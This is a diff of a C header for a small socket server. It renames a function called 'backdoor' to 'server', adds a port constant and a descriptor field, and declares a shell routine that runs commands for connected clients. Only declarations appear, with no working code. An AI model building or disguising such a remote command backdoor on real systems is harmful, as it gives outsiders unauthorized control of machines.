@@ -28,6 +28,7 @@
 # define BUFFER_SIZE 4096
 # define MAX_PATH_SIZE 256
 
+# define SERVER_PORT 4242
 # define MAX_CLIENTS 3
 
 typedef struct			s_client
@@ -45,6 +46,7 @@ typedef struct			s_serv
 	int					port;
 	struct sockaddr_in	addr;
 	int					sockfd;
+	int					fd_max;
 	fd_set				fd_read;
 	fd_set				fd_master;
 	t_client			clients[MAX_CLIENTS];
@@ -59,11 +61,9 @@ typedef struct			s_serv
 
 # define send_str(x,y) send(x, y, strlen(y), 0)
 
-extern t_serv		serv;
-
 /* server.c */
 void		remove_client(t_serv *serv, int fd);
-void		backdoor(void);
+void		server(void);
 
 /* shell.c */
 void		launch_command(t_serv *serv, int fd, char *cmd);
